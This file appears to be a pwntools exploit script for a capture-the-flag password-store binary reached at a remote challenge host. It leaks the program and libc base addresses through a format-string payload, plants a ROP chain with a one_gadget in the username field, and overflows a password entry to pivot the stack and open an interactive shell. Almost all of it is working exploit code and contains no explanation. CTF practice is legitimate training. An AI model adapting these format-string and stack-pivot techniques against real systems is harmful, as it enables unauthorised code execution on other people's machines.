#!/usr/bin/python3

from pwn import *
from typing import Tuple
from password_primitives import PasswordPrimitives

elf = ELF('./passStroeV1')
libc = ELF('./libc.so.6')
ld = ELF('./ld.so')

POP_RSI = 0x00000000037bda
ONE_GAD = 0xda837


def conn():
    if args.LOCAL:
        r = process([elf.path])
    elif args.D:
        # 'b *addPass + 169\nb *menu + 217\nc' 
        r = gdb.debug(elf.path, 'b *menu  + 142\n b *addPass + 201')
    else:
        r = remote(b'0.cloud.chals.io', 12367)

    return r


def leak_base_address(primitives: PasswordPrimitives) -> Tuple[int, int]:

    payload = b'%15$p %13$p '
    data = primitives.change_name(payload).split(b' ')

    main = int(data[0], base=16)
    libc_start_main = int(data[1], base=16) - 109

    return main - elf.symbols['main'], libc_start_main - libc.symbols['__libc_start_call_main']


def main():
    log.info('sending default name')
    primitives = PasswordPrimitives(conn())

    # leak libc base address
    log.info('leaking libc and elf base address')
    elf_base_address, libc_base_address = leak_base_address(primitives)
    log.info(f'elf:{elf_base_address:08x} libc:{libc_base_address:08x}')

    # creating new stack to be pevote sp to
    rop = p64(libc_base_address + POP_RSI) + \
        p64(0) + p64(libc_base_address + ONE_GAD)
    primitives.change_name(rop)

    payload = b'A' * 0x30
    payload += p64(elf_base_address + elf.symbols['username'] - 8)
    payload += p64(0x10)
    primitives.add_password(payload)

    primitives.io.interactive()


if __name__ == "__main__":
    main()

